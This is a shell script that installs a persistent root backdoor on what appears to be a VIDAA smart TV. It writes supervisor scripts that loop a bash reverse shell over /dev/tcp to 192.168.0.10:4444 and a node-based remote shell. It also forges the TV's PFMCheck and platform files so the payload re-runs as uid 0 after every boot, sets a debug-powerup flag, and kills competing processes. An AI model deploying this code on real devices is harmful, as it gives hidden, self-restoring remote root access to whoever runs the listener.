export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
BB=/usr/local/bin/busybox
D=/var/local/alvidaa
mkdir -p "$D"

cat > "$D/alive.sh" <<'ALIVE_EOF'
alive() {
    [ -n "$1" ] && [ -d "/proc/$1" ] || return 1
    grep -qa "$2" "/proc/$1/cmdline" 2>/dev/null
}
ALIVE_EOF
chmod 644 "$D/alive.sh"

echo "=== rshell.sh ==="
cat > "$D/rshell.sh" <<'RSH_EOF'
#!/bin/sh
. /var/local/alvidaa/alive.sh
L=/var/local/alvidaa/rshell.lock
if mkdir "$L" 2>/dev/null; then
    echo $$ > "$L/pid"
else
    alive "$(cat "$L/pid" 2>/dev/null)" rshell.sh && exit 0
    rm -rf "$L"; mkdir "$L" 2>/dev/null || exit 1; echo $$ > "$L/pid"
fi
trap 'rm -rf "$L"' EXIT INT TERM
NODE=/APPS/pkgs/tv.vidaa.app.phoenix/CHA/bin/phoenix
while true; do
    "$NODE" /var/local/alvidaa/rshell.js >> /var/local/alvidaa/rshell.log 2>&1
    echo "rshell exited $(date)" >> /var/local/alvidaa/rshell.log
    sleep 3
done
RSH_EOF
chmod 755 "$D/rshell.sh"

echo "=== phonehome.sh ==="
cat > "$D/phonehome.sh" <<'PH_EOF'
#!/bin/sh
. /var/local/alvidaa/alive.sh
L=/var/local/alvidaa/phonehome.lock
if mkdir "$L" 2>/dev/null; then
    echo $$ > "$L/pid"
else
    alive "$(cat "$L/pid" 2>/dev/null)" phonehome.sh && exit 0
    rm -rf "$L"; mkdir "$L" 2>/dev/null || exit 1; echo $$ > "$L/pid"
fi
trap 'rm -rf "$L"' EXIT INT TERM
while true; do
    /bin/bash -c "exec 3<>/dev/tcp/192.168.0.10/4444 && exec /bin/sh <&3 >&3 2>&3" 2>/dev/null
    sleep 5
done
PH_EOF
chmod 755 "$D/phonehome.sh"

echo "=== svc.sh ==="
cat > "$D/svc.sh" <<'SVC_EOF'
#!/bin/sh
. /var/local/alvidaa/alive.sh
L=/var/local/alvidaa/svc.lock
if mkdir "$L" 2>/dev/null; then
    echo $$ > "$L/pid"
else
    alive "$(cat "$L/pid" 2>/dev/null)" svc.sh && exit 0
    rm -rf "$L"; mkdir "$L" 2>/dev/null || exit 1; echo $$ > "$L/pid"
fi
trap 'rm -rf "$L"' EXIT INT TERM
D=/var/local/alvidaa
while true; do
    /bin/sh "$D/rshell.sh"    >/dev/null 2>&1 < /dev/null &
    /bin/sh "$D/phonehome.sh" >/dev/null 2>&1 < /dev/null &
    [ -f /var/local/pfmParse/PFMCheck ] || /bin/sh "$D/boot.sh" replant >/dev/null 2>&1
    [ -f /var/local/DebugPowerup ] || { touch /var/local/DebugPowerup; chmod 644 /var/local/DebugPowerup; }
    sleep 30
done
SVC_EOF
chmod 755 "$D/svc.sh"

echo "=== boot.sh v3 ==="
cat > "$D/boot.sh" <<'BOOT_EOF'
#!/bin/sh
# alvidaa boot persistence (uid 0). Called from the PFM lane after boot:
#   sh /var/local/alvidaa/boot.sh            -> start the supervisor
#   sh /var/local/alvidaa/boot.sh replant    -> restore the PFM gate only
BB=/usr/local/bin/busybox
LOG=/var/local/alvidaa/boot.log
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
say() { echo "$(date) $*" >> "$LOG"; }

replant() {
    mkdir -p /var/local/pfmParse/Data 2>/dev/null
    cat > /var/local/pfmParse/PFMCheck <<'PFM_EOF'
runSignal=PFM
runCount=99
runMaxCount=1
mkdir -p /var/local/alvidaa
{ /usr/local/bin/busybox id; date; cat /proc/uptime; } > /var/local/alvidaa/proof.txt 2>&1
chmod 755 /var/local/alvidaa; chmod 644 /var/local/alvidaa/proof.txt 2>/dev/null
cp -f /var/local/pfmParse/PFMCheck /var/local/alvidaa/PFMCheck.bak 2>/dev/null; cp -f /var/local/pfmParse/Data/platform.txt /var/local/alvidaa/platform.bak 2>/dev/null; chmod 644 /var/local/alvidaa/PFMCheck.bak /var/local/alvidaa/platform.bak 2>/dev/null
echo "alvidaa payload ran $(date) uid=$(/usr/local/bin/busybox id -u)" >> /var/local/alvidaa/payload.log 2>/dev/null
( sleep 25; /bin/sh /var/local/alvidaa/boot.sh ) >/dev/null 2>&1 &
( sleep 40; /bin/sh /var/local/alvidaa/boot.sh replant ) >/dev/null 2>&1 &
sync
PFM_EOF
    cat > /var/local/pfmParse/Data/platform.txt <<'PLAT_EOF'
osPlatform=mtk9618
osModel=65A85QEVS
osVersion=V0000.09.60A.Q0602
osDebugVersion=0
osChannel=1
osFormat=1
logLimitTime=0
bootPaddingTime=0
signalList=dtv-launcher
runMaxCount=1
userAction=now
PLAT_EOF
    cp -f /var/local/pfmParse/PFMCheck /var/local/alvidaa/PFMCheck.bak 2>/dev/null
    cp -f /var/local/pfmParse/Data/platform.txt /var/local/alvidaa/platform.bak 2>/dev/null
    touch /var/local/DebugPowerup
    chmod 644 /var/local/pfmParse/PFMCheck /var/local/pfmParse/Data/platform.txt \
              /var/local/DebugPowerup /var/local/alvidaa/PFMCheck.bak \
              /var/local/alvidaa/platform.bak 2>/dev/null
    sync
    say "replant done"
}

start() {
    ps 2>/dev/null | grep -v grep | grep -q 'svc\.sh' || {
        $BB setsid /bin/sh /var/local/alvidaa/svc.sh >/dev/null 2>&1 < /dev/null &
        say "svc started pid=$!"
    }
    [ -f /var/local/pfmParse/PFMCheck ] || replant
    [ -f /var/local/DebugPowerup ] || { touch /var/local/DebugPowerup; chmod 644 /var/local/DebugPowerup; }
    sleep 2
    say "listen8008=$(grep -ci ':1F48' /proc/net/tcp 2>/dev/null) boot.sh done"
}

case "$1" in
    replant) replant ;;
    *) say "boot.sh start uptime=$(cut -d' ' -f1 /proc/uptime 2>/dev/null)"; start ;;
esac
BOOT_EOF
chmod 755 "$D/boot.sh"

echo "=== KILL OLD WRAPPERS (node stays alive for this shell) ==="
for pat in 'rshell\.sh' 'phonehome\.sh' 'watchdog\.sh'; do
    ps 2>/dev/null | grep -v grep | grep "$pat" | awk '{print $1}' | while read p; do
        kill -9 "$p" 2>/dev/null && echo "killed $pat $p"
    done
done
rm -rf "$D/svc.lock" "$D/rshell.lock" "$D/phonehome.lock"
rm -f "$D/watchdog.sh" "$D/watchdog.lock"
echo "locks cleared"
ls -l "$D"
echo "=== DONE ==="
exit
